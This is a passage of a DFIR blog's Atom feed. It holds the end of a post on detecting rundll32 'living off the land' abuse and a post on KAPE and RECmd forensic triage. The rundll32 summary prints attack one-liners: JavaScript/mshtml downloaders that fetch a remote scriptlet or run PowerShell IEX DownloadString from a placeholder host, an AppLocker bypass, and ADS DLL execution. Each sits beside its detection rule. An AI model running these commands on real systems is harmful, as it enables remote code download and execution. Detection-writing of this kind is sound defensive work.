<pre class="wp-block-preformatted">Rundll32.exe "C:\Users\*\AppData\Local\OnlineFormFinderTooltab\TooltabExtension.dll",A -hp=https://hp.myway.com/onlineformfinder/ttab02/index.html -ua="(Windows NT 10.0; Win64; MSIE 11.1747; Build 16299; SP 0)" -ul=https://anx.mindspark.com/anx.gif?anxa=%251&amp;anxe=%252&amp;anxt=CE87BC6F-A080-40BF-8E3B-4EE1C18EDBB7&amp;anxtv=2.7.1.3000&amp;anxp=^CPW^xdm373^TTAB02^us&amp;anxsi=&amp;anxv=%253&amp;anxd=2020-04-01&amp;anxr=%254 -hu=SHOW</pre>
<p><!-- /wp:preformatted --></p>
<p></p>
<p><span style="text-decoration:underline">SIGMA Friendly Detection Logic:</span></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>image=rundll32.exe  (commandLine="*\\users\\*http*." AND NOT commandLine=*<em>yourdomain</em>.com*)</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>References:</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>- <a rel="noreferrer noopener" href="https://lolbas-project.github.io/lolbas/Binaries/Rundll32/" target="_blank">https://lolbas-project.github.io/lolbas/Binaries/Rundll32</a><br>- <a rel="noreferrer noopener" href="https://attack.mitre.org/techniques/T1085/" target="_blank">https://attack.mitre.org/techniques/T1085/</a><br>- <a rel="noreferrer noopener" href="https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html" target="_blank">https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html</a></p>
<p><!-- /wp:paragraph --><br />
</body></html></p>]]></content><author><name>Andrew Skatoff</name></author><category term="ATT&amp;amp;CK Detection" /><summary type="html"><![CDATA[- ATT&amp;CK - Detection - LOLBINS Launching a strange binary file on a target endpoint is a good way to raise alarm bells within the target organization's SOC. One of the more common #LOLBINS we see is to use RunDLL32.exe to execute malicious DLL files. This technique is well documented in MITRE's ATT&amp;CK framework under T1085. In this post, we look at detection approaches for 4 sub-techniques. In each case the assumption is that you are logging command execution with Sysmon or at least EventID 4688 (process execution with command lines). Note: Credit for items #1 and #2 goes to the brilliant folks at https://lolbasproject.github.io/lolbas. SubTechnique 1 - Javascript ActiveX Objects Executing simple Javascript downloader.This behavior has been used by malware such as Poweliks. rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" Executing Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site. rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');" Using Rundll32.exe to execute a JavaScript script that runs calc.exe. This will bypass AppLocker even if calc.exe is not on the allowed list. rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()"); Executing Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started. rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);} SIGMA Friendly Detection Logic: image=rundll32.exe AND commandLine="*ActiveXObject*"  OR   commandLine="*WScript.Shell*" OR commandLine="*RunHTMLApplication*” SubTechnique 2 - Alternate data streams Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS). rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain SIGMA Friendly Detection Logic: image=rundll32.exe  | regex commandLine="/^rundll32.+\:.+\..+$/" SubTechnique 3 – Point Function Call RunDll32 can be used to launch an executable via the PointFunctionCall operation. This technique was used by a suspected APT group (APT29). "C:\Windows\system32\rundll32.exe"  C:\Users\Administrator\AppData\Local\cyzfc.dat, PointFunctionCall SIGMA Friendly Detection Logic: image=rundll32.exe  AND commandLine="*PointFunctionCall*" SubTechnique 4 – Network HTTP(s) call for additional payloads Rundll32 can be used to launch a custom DLL that pulls down malware from the internet. The example below is used by Slimware PUA. Rundll32.exe "C:\Users\*\AppData\Local\OnlineFormFinderTooltab\TooltabExtension.dll",A -hp=https://hp.myway.com/onlineformfinder/ttab02/index.html -ua="(Windows NT 10.0; Win64; MSIE 11.1747; Build 16299; SP 0)" -ul=https://anx.mindspark.com/anx.gif?anxa=%251&amp;anxe=%252&amp;anxt=CE87BC6F-A080-40BF-8E3B-4EE1C18EDBB7&amp;anxtv=2.7.1.3000&amp;anxp=^CPW^xdm373^TTAB02^us&amp;anxsi=&amp;anxv=%253&amp;anxd=2020-04-01&amp;anxr=%254 -hu=SHOW SIGMA Friendly Detection Logic: image=rundll32.exe  (commandLine="*\\users\\*http*." AND NOT commandLine=*yourdomain.com*) References: - https://lolbas-project.github.io/lolbas/Binaries/Rundll32- https://attack.mitre.org/techniques/T1085/- https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html]]></summary></entry><entry><title type="html">Find Evil in 5 Easy Steps - Part2</title><link href="https://dfirtnt.github.io/2020/06/09/find-evil-in-5-easy-steps-part2/" rel="alternate" type="text/html" title="Find Evil in 5 Easy Steps - Part2" /><published>2020-06-09T00:40:16-04:00</published><updated>2020-06-09T00:40:16-04:00</updated><id>https://dfirtnt.github.io/2020/06/09/find-evil-in-5-easy-steps-part2</id><content type="html" xml:base="https://dfirtnt.github.io/2020/06/09/find-evil-in-5-easy-steps-part2/"><![CDATA[In Part 1 we talked about Loki, Logparser and DeepBlueCLI for analyzing offline forensic artifacts in an effort to get the low hanging fruit left behind by most threat actors. Part 2 will focus on KAPE and Windows Registry analysis.

## 4. Parse all the things with KAPE!

[KAPE](https://www.kroll.com/en/services/cyber-risk/investigate-and-respond/kroll-artifact-parser-extractor-kape) is a free tool which helps DFIR analysts to collect evidence from live endpoints and analyze them. Fortunately, these two functions are independent and you can use KAPE for offline analysis of artifacts collected from any forensically sound tool. As we did in Part1, we are going to assume you have a collection of evidence from a victim endpoint which contains file system artifacts (e.g. MFT, EventLogs, Registry Files, etc). KAPE provides a command line version and GUI version which helps new users learn the syntax!

We will start by launching gKAPE.exe (the GUI version) and telling it we don't want to collect new data (target options - left) but we only want to use the analysis mode (module options - right).

![KAPE Interface](https://dfirtnt.wordpress.com/wp-content/uploads/2020/06/capture.png?w=1024)

For "Module source" provide a path to your forensic collection (e.g. C:\temp\cases\inc1234\files\C)

For "Module destination" provide a path to the location where you would like the output files to be written (e.g. C:\temp\cases\inc123).

Next we will select several modules for parsing the registry, prefetch, amcache, etc. You can quickly filter the 100+ modules to find the items that may interest you. One quick way to focus on things usable on offline collections is to filter out any items from the Folder and Category "Live Response." To access the advance filtering menu, click on the "ABC" icon in the top row. Select "Does not contain" and then type "live". Repeat for both columns.

While browsing through the available modules double clicking on any of them will open a new dialogue which explains the details of what the module will do. The author of KAPE (Eric Zimmerman) helpfully put all his awesome parsers in one place (although some of them are duplicated in other modules). For today's purposes, we will select his modules in bulk by checking the box next to "!EZParser"

At this point, we are ready to kick off the simplest job for parsing tons of important data. The GUI helpfully provides the cmd equivalent at the bottom of the dialogue box. So you can copy/paste that into CMD or simply click "Execute"

This will launch each of the following Eric Zimmerman parsers against your entire collection and create CSV formatted output for each of them by category. The parsers are as follows:

* AmcacheParser
* AppCompatCacheParser
* EvtxECmd
* JLECmd
* LECmd
* PECmd
* RBCmd
* SBECmd
* RecentFileCacheParser
* RECmd
* WxTCmd
* MFTECmd

KAPE will create a folder structure within the destination directory you specified above by category. Like so:

```
C:\temp\cases\inc123\Registry
C:\temp\cases\inc123\FileDeletion
C:\temp\cases\inc123\FileSystem
```

... etc.

KAPE provides a ton more options and is extensible for your own tools/code. I will cover more on that in a future post. For now, let's pause here. Now that we have extracted tons of human friendly data from our collection, let's set it aside for later use.

## 5. Registry Searching Cheats

The buzz word "fileless malware" has gained traction in the last 5 years as threat actors have begun to rely more heavily on "living off the land" and minimizing their footprint on disk. In addition to using native OS commands many threat actors are using the registry for code configuration, credentials, persistence, and even to store shellcode.

With a few quick RECmd queries we can cover several of these techniques. RECmd is Eric Zimmerman's standalone command line tool for forensic registry analysis. It is closely tied to Registry Explorer which provides a graphical interface to allow deeper analysis.

Since you know how to read help menus, I'll spare you the background, if you promise to launch `RECmd.exe /?` and read the instructions. Since this is a "Tips and Tricks" blog, I'll cut straight to the sweet sweet commands:

### Query HKCU for records of exes in suspicious locations:

```
RECmd.exe -f "C:\temp\case\files\C\Users\%USERNAME%\NTUSER.DAT" -k "Software\Microsoft\Windows\CurrentVersion\Run" -s
```

### Query for suspicious service creation:

```
RECmd.exe -f "C:\temp\case\files\C\Windows\System32\config\SYSTEM" -k "SYSTEM\CurrentControlSet\Services" -s | findstr /i "suspicious"
```

### Query for COM object hijacking:

```
RECmd.exe -f "C:\temp\case\files\C\Windows\System32\config\SOFTWARE" -k "SOFTWARE\Classes\CLSID" -s | findstr /i "\\shell\\open\\command"
```

These are just a few examples. The registry is a treasure trove of forensic artifacts, and RECmd makes it easy to search through offline registry hives quickly.

## Summary

In this two-part series, we've covered 5 essential techniques for finding evil on suspect machines:

1. **LOKI IOC Scanner** - For pattern-based detection
2. **Process Execution Discovery** - For LOLBIN activity
3. **Event Log Pattern Matching** - For suspicious behaviors
4. **KAPE Parsing** - For comprehensive artifact extraction
5. **Registry Analysis** - For persistence and configuration

These tools and techniques provide a solid foundation for triaging suspicious endpoints and finding evidence of compromise. Remember, the key is to start with the low-hanging fruit and work your way up to more sophisticated analysis techniques.

Happy hunting!]]></content><author><name>Andrew Skatoff</name></author><summary type="html"><![CDATA[In Part 1 we talked about Loki, Logparser and DeepBlueCLI for analyzing offline forensic artifacts in an effort to get the low hanging fruit left behind by most threat actors. Part 2 will focus on KAPE and Windows Registry analysis.]]></summary></entry></feed>